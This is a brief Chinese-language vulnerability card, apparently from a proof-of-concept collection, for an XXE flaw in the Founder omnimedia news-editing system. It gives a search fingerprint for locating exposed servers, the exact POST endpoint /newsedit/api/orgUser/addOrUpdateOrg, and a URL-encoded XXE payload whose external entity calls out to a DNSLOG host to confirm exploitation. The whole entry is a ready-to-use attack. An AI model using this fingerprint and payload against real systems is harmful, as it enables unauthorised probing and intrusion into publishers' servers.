# 方正全媒体采编系统addorupdateorg存在XXE漏洞

方正全媒体采编系统 ｜ XXE ｜ —
- **指纹**：`app="FOUNDER-全媒体采编系统"`
- **请求**：`POST /newsedit/api/orgUser/addOrUpdateOrg HTTP/1.1`

**Payload**
```
xmlStr=%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http://DNSLOG.com%22%3E%20%25remote;%5D%3E
```
- **响应特征**：200 DNSLOG回显